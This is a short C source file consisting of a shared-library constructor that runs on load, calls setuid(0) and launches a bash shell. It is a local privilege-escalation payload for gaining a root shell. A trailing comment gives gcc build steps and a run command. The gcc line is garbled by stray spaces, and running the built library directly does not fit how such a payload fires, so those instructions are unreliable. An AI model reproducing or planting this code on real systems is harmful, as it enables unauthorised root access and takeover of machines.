void __attribute__((constructor)) init()

{
    setuid(0);

    system("/bin/bash");
}

/*
    gcc - w - fPIC - shared - o / tmp / ceshi root.c
    cd /tmp/
    ./ceshi
*/